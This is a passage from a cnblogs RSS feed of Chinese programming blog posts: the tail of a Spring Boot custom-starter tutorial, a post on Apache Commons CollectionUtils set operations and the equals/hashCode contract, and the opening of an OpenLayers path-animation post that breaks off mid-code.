@EnableConfigurationProperties(HelloProperties.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HelloServiceAutoConfiguration {

    @Autowired
    HelloProperties helloProperties;
    @Bean
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; HelloService helloService(){
        HelloService service &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; HelloService();
        service.setHelloProperties(helloProperties);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; service;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这个时候我们的自动配置以及写完，还差最后一步，因为SpringBoot读取自动配置是在META-INF的spring.factories文件中，所以我们还要将我们的自动配置类写入其中&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
  com.yuanqinnan.starter.HelloServiceAutoConfiguration&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最后的结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155931539-1642889.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至此，代码以及编写完成，这个时候我们将其装入仓库中，让其他项目引用&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;3.2 使用自定义starter&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;创建一个web项目，然后在项目中引入依赖&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt;引入自定义starter&lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;com.yuanqinnan.starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;yuanqinnan-springboot-starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.0-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在application.properties 配置中加上配置：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;yuanqinnan.hello.prefix=早安
yuanqinnan.hello.suffix=晚安&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;加入测试：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Autowired
HelloService helloService;
​
@Test
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; contextLoads() {
    System.out.println(helloService.sayHello(&lt;/span&gt;&quot;世界&quot;&lt;span&gt;));
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这样自定义Starter和引用自定义都已完成，Springboot的核心知识已经总结完成，后面再进行Springboot的一些高级场景整合，如缓存、消息、检索、分布式等。&lt;/p&gt;

</description>
<pubDate>Sun, 28 Apr 2019 13:57:00 +0000</pubDate>
<dc:creator>茶底世界</dc:creator>
<og:description>一、引言 SpringBoot的一大优势就是Starter，由于SpringBoot有很多开箱即用的Starter依赖，使得我们开发变得简单，我们不需要过多的关注框架的配置。 在日常开发中，我们也会自</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yuanqinnan/p/10784508.html</dc:identifier>
</item>
<item>
<title>java代码之美（12）---CollectionUtils工具类 - 雨点的名字</title>
<link>http://www.cnblogs.com/qdhxhz/p/10787130.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qdhxhz/p/10787130.html</guid>
<description>&lt;center&gt;

&lt;/center&gt;
&lt;p&gt;这篇讲的CollectionUtils工具类是在&lt;code&gt;apache下&lt;/code&gt;的, 而不是springframework下的CollectionUtils。&lt;/p&gt;
&lt;p&gt;个人觉得CollectionUtils在真实项目中,可以使你的代码更加简洁和安全。&lt;/p&gt;
&lt;p&gt;所以需要倒入相关jar包,目前从maven找到最新jar包如下:&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;    &amp;lt;dependency&amp;gt;
        &amp;lt;groupId&amp;gt;org.apache.commons&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;commons-collections4&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;4.3&amp;lt;/version&amp;gt;
    &amp;lt;/dependency&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;一api常用方法&quot;&gt;&lt;span&gt;一、API常用方法&lt;/span&gt;&lt;/h2&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;        /**
         * 1、除非元素为null，否则向集合添加元素
         */
        CollectionUtils.addIgnoreNull(personList,null);
        /**
         * 2、将两个已排序的集合a和b合并为一个已排序的列表，以便保留元素的自然顺序
         */
        CollectionUtils.collate(Iterable&amp;lt;? extends O&amp;gt; a, Iterable&amp;lt;? extends O&amp;gt; b)
        /**
         * 3、将两个已排序的集合a和b合并到一个已排序的列表中，以便保留根据Comparator c的元素顺序。
         */
        CollectionUtils.collate(Iterable&amp;lt;? extends O&amp;gt; a, Iterable&amp;lt;? extends O&amp;gt; b, Comparator&amp;lt;? super O&amp;gt; c)
        /**
         * 4、返回该个集合中是否含有至少有一个元素
         */
        CollectionUtils.containsAny(Collection&amp;lt;?&amp;gt; coll1, T... coll2)
        /**
         * 5、如果参数是null，则返回不可变的空集合，否则返回参数本身。（很实用 ,最终返回List EMPTY_LIST = new EmptyList&amp;lt;&amp;gt;()）
         */
        CollectionUtils.emptyIfNull(Collection&amp;lt;T&amp;gt; collection)
        /**
         * 6、空安全检查指定的集合是否为空
         */
        CollectionUtils.isEmpty(Collection&amp;lt;?&amp;gt; coll)
        /**
         * 7、 空安全检查指定的集合是否为空。
         */
        CollectionUtils.isNotEmpty(Collection&amp;lt;?&amp;gt; coll)
        /**
         * 8、反转给定数组的顺序。
         */
        CollectionUtils.reverseArray(Object[] array);
        /**
         * 9、差集
         */
        CollectionUtils.subtract(Iterable&amp;lt;? extends O&amp;gt; a, Iterable&amp;lt;? extends O&amp;gt; b)
        /**
         * 10、并集
         */
        CollectionUtils.union(Iterable&amp;lt;? extends O&amp;gt; a, Iterable&amp;lt;? extends O&amp;gt; b)
        /**
         * 11、交集
         */
        CollectionUtils.intersection(Collection a, Collection b)
        /**
         *12、 交集的补集（析取）
         */
        CollectionUtils.disjunction(Collection a, Collection b)&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;二非对象集合交并差处理&quot;&gt;&lt;span&gt;二、非对象集合交、并、差处理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;对于集合取交集、并集的处理其实有很多种方式,这里就介绍3种&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第一种 是CollectionUtils工具类&lt;/li&gt;
&lt;li&gt;第二种 是List自带方法&lt;/li&gt;
&lt;li&gt;第三种 是JDK1.8 stream 新特性&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;collectionutils工具类&quot;&gt;1、CollectionUtils工具类&lt;/h4&gt;
&lt;p&gt;下面对于基本数据(包扩String)类型中的集合进行demo示例。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt; public static void main(String[] args) {
        String[] arrayA = new String[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;};
        String[] arrayB = new String[] { &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot; };
        List&amp;lt;String&amp;gt; listA = Arrays.asList(arrayA);
        List&amp;lt;String&amp;gt; listB = Arrays.asList(arrayB);

        //1、并集 union
        System.out.println(CollectionUtils.union(listA, listB));
        //输出: [1, 2, 3, 4, 5, 6]

        //2、交集 intersection
        System.out.println(CollectionUtils.intersection(listA, listB));
        //输出:[3, 4]

        //3、交集的补集（析取）disjunction
        System.out.println(CollectionUtils.disjunction(listA, listB));
        //输出:[1, 2, 5, 6]

        //4、差集（扣除）
        System.out.println(CollectionUtils.subtract(listA, listB));
        //输出:[1, 2]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;list自带方法&quot;&gt;2、List自带方法&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    public static void main(String[] args) {
        String[] arrayA = new String[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;};
        String[] arrayB = new String[] { &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot; };
        List&amp;lt;String&amp;gt; listA = Arrays.asList(arrayA);
        List&amp;lt;String&amp;gt; listB = Arrays.asList(arrayB);

        //1、交集
        List&amp;lt;String&amp;gt;  jiaoList = new ArrayList&amp;lt;&amp;gt;(listA);
        jiaoList.retainAll(listB);
        System.out.println(jiaoList);
        //输出:[3, 4]

       //2、差集
        List&amp;lt;String&amp;gt;  chaList = new ArrayList&amp;lt;&amp;gt;(listA);
        chaList.removeAll(listB);
        System.out.println(chaList);
        //输出:[1, 2]

        //3、并集 (先做差集再做添加所有）
        List&amp;lt;String&amp;gt;  bingList = new ArrayList&amp;lt;&amp;gt;(listA);
        bingList.removeAll(listB); // bingList为 [1, 2]
        bingList.addAll(listB);  //添加[3,4,5,6]
        System.out.println(bingList);
        //输出:[1, 2, 3, 4, 5, 6]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; : &lt;strong&gt;intersection和retainAll的差别&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;要注意的是它们的返回类型是不一样的,&lt;code&gt;intersection&lt;/code&gt;返回的是一个新的List集合，而&lt;code&gt;retainAll&lt;/code&gt;返回是Bollean类型那就说明retainAll方法是对原有集合进行处理再返回原有集合,会改变原有集合中的内容。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;个人观点&lt;/code&gt;：1、从性能角度来考虑的话,List自带会高点,因为它不用再创建新的集合。2、需要注意的是：因为retainAll因为会改变原有集合,所以该集合需要多次使用就不适合用retainAll。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;: Arrays.asList将数组转集合不能进行add和remove操作。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;原因&lt;/code&gt;：调用Arrays.asList()生产的List的add、remove方法时报异常，这是由&lt;code&gt;Arrays.asList() 返回的市Arrays的内部类ArrayList， 而不是java.util.ArrayList&lt;/code&gt;。Arrays的内部类ArrayList和java.util.ArrayList都是继承AbstractList，remove、add等方法AbstractList中是默认throw UnsupportedOperationException而且不作任何操作。java.util.ArrayList重新了这些方法而Arrays的内部类ArrayList没有重新，所以会抛出异常。&lt;/p&gt;
&lt;p&gt;所以正确做法如下&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;        String[] array = {&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;};
        List&amp;lt;String&amp;gt; list = Arrays.asList(array);
        List arrList = new ArrayList(list);
        arrList.add(&quot;6&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;jdk1.8-stream-新特性&quot;&gt;3、JDK1.8 stream 新特性&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    public static void main(String[] args) {
        String[] arrayA = new String[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;};
        String[] arrayB = new String[] { &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot; };
        List&amp;lt;String&amp;gt; listA = Arrays.asList(arrayA);
        List&amp;lt;String&amp;gt; listB = Arrays.asList(arrayB);

        // 交集
        List&amp;lt;String&amp;gt; intersection = listA.stream().filter(item -&amp;gt; listB.contains(item)).collect(toList());
        System.out.println(intersection);
        //输出:[3, 4]

        // 差集 (list1 - list2)
        List&amp;lt;String&amp;gt; reduceList = listA.stream().filter(item -&amp;gt; !listB.contains(item)).collect(toList());
        System.out.println(reduceList);
        //输出:[1, 2]

        // 并集 （新建集合:1、是因为不影响原始集合。2、Arrays.asList不能add和remove操作。
        List&amp;lt;String&amp;gt; listAll = listA.parallelStream().collect(toList());
        List&amp;lt;String&amp;gt; listAll2 = listB.parallelStream().collect(toList());
        listAll.addAll(listAll2);
        System.out.println(listAll);
        //输出:[1, 2, 3, 4, 3, 4, 5, 6]

        // 去重并集 
        List&amp;lt;String&amp;gt; list =new ArrayList&amp;lt;&amp;gt;(listA);
        list.addAll(listB);
        List&amp;lt;String&amp;gt; listAllDistinct = list.stream().distinct().collect(toList());
        System.out.println(listAllDistinct);
        //输出:[1, 2, 3, 4, 5, 6]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;总结&lt;/code&gt; ： 这三种我还是&lt;code&gt;最喜欢第一种方式&lt;/code&gt;，因为第二种还需要确定该集合是否被多次调用。第三种可读性不高。&lt;/p&gt;

&lt;h2 id=&quot;三对象集合交并差处理&quot;&gt;&lt;span&gt;三、对象集合交、并、差处理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;因为对象的equels比较是比较两个对象的内存地址，所以除非是同一对象，否则equel返回永远是false。&lt;/p&gt;
&lt;p&gt;但我们实际开发中 在我们的业务系统中判断对象时有时候需要的不是一种严格意义上的相等，而是一种业务上的对象相等。在这种情况下，原生的equals方法就不能满足我们的需求了，所以这个时候我们需要重写equals方法。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;说明&lt;/code&gt; :String为什么可以使用equels方法为什么只要字符串相等就为true,那是因为String类重写了equal和hashCode方法，比较的是值。&lt;/p&gt;
&lt;h4 id=&quot;person对象&quot;&gt;1、Person对象&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Person {
    private String name;
    private Integer age;
    public Person(String name, Integer age) {
        this.name = name;
        this.age = age;
    }
    /**
     * 为什么重写equals方法一定要重写hashCode方法下面也会讲
     */
    @Override
    public int hashCode() {
        String result = name + age;
        return result.hashCode();
    }
    /**
     * 重写 equals 方法 根据name和age都相同那么对象就默认相同
     */
    @Override
    public boolean equals(Object obj) {
        Person u = (Person) obj;
        return this.getName().equals(u.getName()) &amp;amp;&amp;amp; (this.age.equals(u.getAge()));
    }
    /**
     * 重写 toString 方法
     */
    @Override
    public String toString() {
        return &quot;Person{&quot; +
                &quot;name='&quot; + name + '\'' +
                &quot;, age=&quot; + age +
                '}';
    }
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;测试&quot;&gt;2、测试&lt;/h4&gt;
&lt;p&gt;这里根据name和age都相同那么就默认相同对象。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    public static void main(String[] args) {

        List&amp;lt;Person&amp;gt; personList = Lists.newArrayList();
        Person person1 = new Person(&quot;小小&quot;,3);
        Person person2 = new Person(&quot;中中&quot;,4);
        personList.add(person1);
        personList.add(person2);

        List&amp;lt;Person&amp;gt; person1List = Lists.newArrayList();
        Person person3 = new Person(&quot;中中&quot;,4);
        Person person4 = new Person(&quot;大大&quot;,5);
        person1List.add(person3);
        person1List.add(person4);
        /**
         * 1、差集
         */
        System.out.println(CollectionUtils.subtract(personList, person1List));
        //输出:[Person{name='小小', age=3}]

        /**
         * 2、并集
         */
        System.out.println(CollectionUtils.union(personList, person1List));
        //输出:[Person{name='小小', age=3}, Person{name='中中', age=4}, Person{name='大大', age=5}]

        /**
         * 3、交集
         */
        System.out.println(CollectionUtils.intersection(personList, person1List));
        //输出:[Person{name='中中', age=4}]

        /**
         * 4、交集的补集（析取）
         */
        System.out.println(CollectionUtils.disjunction(personList, person1List));
        //输出:[Person{name='小小', age=3}, Person{name='大大', age=5}]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其它两种方式就不在测了，因为都一样。&lt;/p&gt;

&lt;h2 id=&quot;四为什么重写equels方法一定要重写hashcode方法&quot;&gt;&lt;span&gt;四、为什么重写equels方法一定要重写hashCode方法&lt;/span&gt;&lt;/h2&gt;
&lt;h4 id=&quot;源码&quot;&gt;1、源码&lt;/h4&gt;
&lt;p&gt;其实上面的Person类我可以只重写equels方法而不写hashCode方法,一样能达到上面的效果。但为什么还是建议写上呢？官方的说法是:&lt;code&gt;对象的equals方法被重写，那么对象的hashCode()也尽量重写&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;重写equals()方法就必须重写hashCode()方法的原因，从源头Object类讲起就更好理解了。&lt;/p&gt;
&lt;p&gt;先来看Object关于hashCode()和equals()的源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  public native int hashCode();
        
  public boolean equals(Object obj) {
           return (this == obj);
      }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;光从代码中我们可以知道，&lt;code&gt;hashCode()方法是一个本地native方法&lt;/code&gt;，返回的是对象引用中存储的对象的内存地址。而equals方法是利用==来比较的也是对象的内存地址。从上边我们可以看出，hashCode方法和equals方法是一致的。还有最关键的一点，我们来看Object类中关于hashCode()方法的注释：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  1.在 Java 应用程序执行期间，在对同一对象多次调用 hashCode 方法时，必须一致地返回相同的整数，前提是将对象进行 equals 比较时所用的信息没有被修改。    
  2.如果根据 equals(Object) 方法，两个对象是相等的，那么对这两个对象中的每个对象调用 hashCode 方法都必须生成相同的整数结果。    
  3.如果根据 equals(java.lang.Object) 方法，两个对象不相等，那么对这两个对象中的任一对象上调用 hashCode 方法不 要求一定生成不同的整数结果。
     但是，程序员应该意识到，为不相等的对象生成不同整数结果可以提高哈希表的性能。      
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;整理&lt;/code&gt; : hashCode()和equals()保持一致，如果equals方法返回true，那么两个对象的hasCode()返回值必须一样。如果equals方法返回false，hashcode可以不一样，但是这样不利于哈希表的性能，一般我们也不要这样做。&lt;/p&gt;
&lt;p&gt;假设两个对象，重写了其equals方法，其相等条件是某属性相等，就返回true。如果不重写hashcode方法，其返回的依然是两个对象的内存地址值，必然不相等。这就出现了equals方法相等，但是hashcode不相等的情况。这不符合hashcode的规则。&lt;/p&gt;
&lt;h4 id=&quot;hashset和map集合类型&quot;&gt;2、HashSet和Map集合类型&lt;/h4&gt;
&lt;p&gt;重写equals()方法就必须重写hashCode()方法主要是针对HashSet和Map集合类型,而对于List集合倒没什么影响。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;原因&lt;/code&gt;： 在向HashSet集合中存入一个元素时，HashSet会调用该对象（存入对象）的hashCode()方法来得到该对象的hashCode()值，然后&lt;code&gt;根据该hashCode值决定该对象在HashSet中存储的位置&lt;/code&gt;。简单的说：&lt;code&gt;HashSet集合判断两个元素相等的标准是：两个对象通过equals()方法比较相等，并且两个对象的HashCode()方法返回值也相等&lt;/code&gt;。如果两个元素通过equals()方法比较返回true，但是它们的hashCode()方法返回值不同，HashSet会把它们存储在不同的位置，依然可以添加成功。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;这就是问题所在&lt;/code&gt;：就是如果你只重写equals()方法，而不重写hashCode(),如果equals()为true,而它们的hashCode()方法返回值肯定不一样，因为它们都不是同一对象所以内存地址肯定不一样，所以它还是添加成功了，那么其实你写的equals()方法根本没啥软用。&lt;/p&gt;
&lt;h4 id=&quot;代码示例&quot;&gt;3、代码示例&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;1、People类&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;重写equals方法,但并没有hashCode方法。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class People {
    private String name;
    private Integer age;

    public People(String name, Integer age) {
        this.name = name;
        this.age = age;
    }

    /**
     * 重写 equals 方法
     */
    @Override
    public boolean equals(Object obj) {
        People u = (People) obj;
        return this.getName().equals(u.getName()) &amp;amp;&amp;amp; (this.age.equals(u.getAge()));
    }
    /**
     * 重写 toString 方法
     */
    @Override
    public String toString() {
        return &quot;People{&quot; +
                &quot;name='&quot; + name + '\'' +
                &quot;, age=&quot; + age +
                '}';
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;2、实现类&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    public static void main(String[] args) {
        HashSet&amp;lt;People&amp;gt; hashSet = Sets.newHashSet();
        People people1 = new People(&quot;小小&quot;,3);
        People people2 = new People(&quot;中中&quot;,4);
        People people3 = new People(&quot;中中&quot;,4);
        People people4 = new People(&quot;大大&quot;,5);
        hashSet.add(people1);
        hashSet.add(people2);
        hashSet.add(people3);
        hashSet.add(people4);

        System.out.println(hashSet);
        //输出:[People{name='小小', age=3}, People{name='中中', age=4}, People{name='大大', age=5}, People{name='中中', age=4}]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;很明显,我重写了equals方法,那么people2和people3的equals应该相同，所以不能放入HashSet,但它们的hashCode()方法返回不同，所以导致同样能放入HashSet。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;重点&lt;/code&gt;：对于Set集合必须要同时重写这两个方法，要不然Set的特性就被破坏了。&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;只要自己变优秀了，其他的事情才会跟着好起来（少将8）&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sun, 28 Apr 2019 13:57:00 +0000</pubDate>
<dc:creator>雨点的名字</dc:creator>
<og:description>java代码之美（12） CollectionUtils工具类 这篇讲的CollectionUtils工具类是在 的, 而不是springframework下的CollectionUtils。 个人觉</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/qdhxhz/p/10787130.html</dc:identifier>
</item>
<item>
<title>OpenLayer实现路径运动 - 小龙女先生</title>
<link>http://www.cnblogs.com/cqhaibin/p/10786886.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/cqhaibin/p/10786886.html</guid>
<description>&lt;p&gt;     近期由于业务的需求，让我这从未想过要碰Web Gis的业余前端开发者，走了Web Gis的开发道路。功能需求很简单，但却也是让自己难为了好几天。如，应该选择那个Gis框架，Gis框架的兼容性如何，直接Ie哪些版，能不能简单到只有一张图片就行解决问题，等等。。。。。。&lt;/p&gt;
&lt;p&gt;在如此多的技术盲点，以及不确定的因素，我开始了征程，现将一些心得做些记录。&lt;/p&gt;
&lt;h2&gt;一、需求分析&lt;/h2&gt;
&lt;p&gt;     客户需要的功能就是能在一张Gis图上实现小车根据路径进行移动，为什么一定要Gis呢(这是客户指定需求，无语一该)。并且客户还说底图要很容易更换，但他想要用Gis表现的却是室内的地理信息，我也没办法用baidu, 高德等现成的Gis接口。&lt;/p&gt;
&lt;p&gt;针对上述需求，我没有去了解过多的web gis框架。因为客户对Gis的概念就是能放大，缩小，可以做路径规划等。所以我就选择ol，利用他的静态图片(选择这个是为满足客户灵活更新底图的需求)做Gis底图的功能来解决此问题。&lt;/p&gt;
&lt;h2&gt;二、效果展示&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/cqhaibin/1049064/o_ol-trace.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;三、伪代码实现&lt;/h2&gt;
&lt;p&gt;由于是技术验证代码， 有些杂乱，现只给出关键性代码。如有业务需要欢迎共同讨论。&lt;/p&gt;
&lt;h3&gt;3.1 实现路径的绘制&lt;/h3&gt;
&lt;p&gt;此步骤还是相对简单的，主要用到Ol的Draw对象，代码哪下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;draw(type){
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.stopdraw();
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;._draw = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Draw({
            source: &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.layer.getSource(),
            type: type &lt;/span&gt;== 'Icon' ? 'Point'&lt;span&gt; : type
        });
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;._draw.on('drawend', (event)=&amp;gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(type == 'LineString'&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.traceLine =&lt;span&gt; event.feature;
            }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(type != 'Icon') &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            let f &lt;/span&gt;=&lt;span&gt; event.feature;
            f.setStyle(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Style({
                image: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Icon({
                    src: &lt;/span&gt;'/content/battery.gif'&lt;span&gt;
                }),
                text: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Text({
                    text: &lt;/span&gt;'new item'&lt;span&gt;,
                    fill: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Fill({
                        color: &lt;/span&gt;&quot;red&quot;&lt;span&gt;
                    })
                })
            }));
            f.type &lt;/span&gt;= 'battery'&lt;span&gt;;
        });
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.map.addInteraction(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;._draw);
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;._snap = &lt;span&gt;new&lt;/span&gt; Snap({source: &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.layer.getSource()});
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.map.addInteraction(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;._snap);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;关键代码在于drawend事件的监听，如果是LineString情况，就将此feature放在一个共公变量，方便路径运行时使用。&lt;/p&gt;

&lt;h3&gt;3.2 分解路径数据&lt;/h3&gt;
&lt;p&gt;     此部分就是获取到3.1步骤的路径路径，然后进行解析，因为3.1上的linestring是多个线段的集合，但运动其本质就是改变图标的坐标，使其快速且连续的变化就形成了移动效果。所以这里有一个方法进行路径细分，代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;cutTrace(){
        let traceCroods &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.traceLine.getGeometry().getCoordinates(); 
        let len &lt;/span&gt;=&lt;span&gt; traceCroods.length;
        let destCroods &lt;/span&gt;=&lt;span&gt; [];
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0; i &amp;lt; len - 1; ++&lt;span&gt;i){
            let bPoint &lt;/span&gt;=&lt;span&gt; traceCroods[i];
            let ePoint &lt;/span&gt;= traceCroods[i+1&lt;span&gt;];
            let bevelling &lt;/span&gt;= Math.sqrt(Math.pow(ePoint[0] - bPoint[0], 2&lt;span&gt;)
            &lt;/span&gt;+ Math.pow(ePoint[1] - bPoint[1], 2&lt;span&gt;) );
            let cosA &lt;/span&gt;= (ePoint[0] - bPoint[0]) /&lt;span&gt; bevelling;
            let sinA &lt;/span&gt;= (ePoint[1] - bPoint[1]) /&lt;span&gt; bevelling;
            
            let curStep &lt;/span&gt;= 0&lt;span&gt;;
            let step &lt;/span&gt;= 5&lt;span&gt;;
            destCroods.push(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Point([bPoint[0], bPoint[1&lt;span&gt;]]));
            &lt;/span&gt;&lt;span&gt;do&lt;/span&gt;&lt;span&gt;{
                curStep&lt;/span&gt;++&lt;span&gt;;
                let nextPoint;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(curStep * step &amp;gt;=&lt;span&gt; bevelling){
                    nextPoint &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Point([ePoint[0], ePoint[1&lt;span&gt;]]);
                }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                    nextPoint &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Point([
